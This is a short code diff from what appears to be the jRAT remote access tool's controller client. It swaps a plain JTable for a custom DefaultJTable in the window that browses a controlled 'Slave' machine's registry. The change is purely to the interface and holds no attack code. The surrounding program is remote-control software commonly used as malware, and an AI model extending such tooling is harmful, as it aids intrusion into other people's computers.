@@ -33,6 +33,7 @@ import javax.swing.table.DefaultTableModel;
 import se.jrat.client.Slave;
 import se.jrat.client.packets.outgoing.Packet79BrowseRegistry;
 import se.jrat.client.packets.outgoing.Packet80CustomRegQuery;
+import se.jrat.client.ui.components.DefaultJTable;
 import se.jrat.client.ui.components.tree.PathJTree;
 import se.jrat.client.ui.components.tree.PathListener;
 import se.jrat.client.ui.components.tree.PathTreeModel;
@@ -111,7 +112,7 @@ public class FrameRemoteRegistry extends BaseFrame {
 		splitPane.setRightComponent(scrollPane);
 		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
 
-		table = new JTable();
+		table = new DefaultJTable();
 		table.addMouseListener(new MouseAdapter() {
 			@Override
 			public void mouseClicked(MouseEvent e) {
